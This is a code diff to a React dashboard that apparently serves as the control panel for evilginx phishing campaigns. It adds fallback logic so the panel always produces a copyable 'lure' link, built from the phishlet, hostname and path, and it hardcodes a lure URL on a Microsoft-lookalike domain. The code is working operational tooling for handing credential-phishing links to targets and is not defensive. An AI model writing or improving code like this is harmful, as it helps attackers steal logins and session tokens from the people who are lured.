@@ -308,6 +308,8 @@ export default function Dashboard() {
       localStorage.setItem("selectedLureId", selectedLure.id);
     }
 
+    let gotValidUrl = false;
+
     // Get the exact URL by calling the evilginx command through our API
     try {
       const lureUrlResponse = await fetch(
@@ -317,26 +319,41 @@ export default function Dashboard() {
         const data = await lureUrlResponse.json();
         if (data.url && data.url !== "https://msoft.cam/wYyGBBeI") {
           setFullLink(data.url);
-          setLinkLoading(false);
+          gotValidUrl = true;
         }
       }
     } catch (error) {
       console.error("Error fetching lure URL:", error);
-      // Fall back to the API-based approach if the command fails
+    }
+
+    // If first method failed, try the fallback method
+    if (!gotValidUrl) {
       try {
         const linkResponse = await fetch(
           `/api/full-link?lureId=${selectedLure.id}`
         );
         if (linkResponse.ok) {
           const data = await linkResponse.json();
-          setFullLink(data.fullUrl);
+          if (data.fullUrl) {
+            setFullLink(data.fullUrl);
+            gotValidUrl = true;
+          }
         }
       } catch (linkError) {
         console.error("Error fetching updated link:", linkError);
-      } finally {
-        setLinkLoading(false);
       }
     }
+
+    // Create a fallback URL if we couldn't get one from the APIs
+    if (!gotValidUrl) {
+      const fallbackUrl = `${selectedLure.phishlet}.${
+        selectedLure.hostname || window.location.hostname
+      }${selectedLure.path}`;
+      setFullLink(fallbackUrl);
+    }
+
+    // Always turn off loading regardless of success or failure
+    setLinkLoading(false);
 
     // Update link settings with the selected lure path
     try {
@@ -913,9 +930,16 @@ export default function Dashboard() {
                     "No link selected"
                   )}
                 </span>
-                {selectedLure && fullLink && !linkLoading && (
+                {selectedLure && !linkLoading && (
                   <button
-                    onClick={() => copyToClipboard(fullLink)}
+                    onClick={() =>
+                      copyToClipboard(
+                        fullLink ||
+                          `${selectedLure.phishlet}.${
+                            selectedLure.hostname || window.location.hostname
+                          }${selectedLure.path}`
+                      )
+                    }
                     data-allow-context-menu="true"
                     className="text-indigo-500 hover:text-indigo-400 transition-colors"
                   >
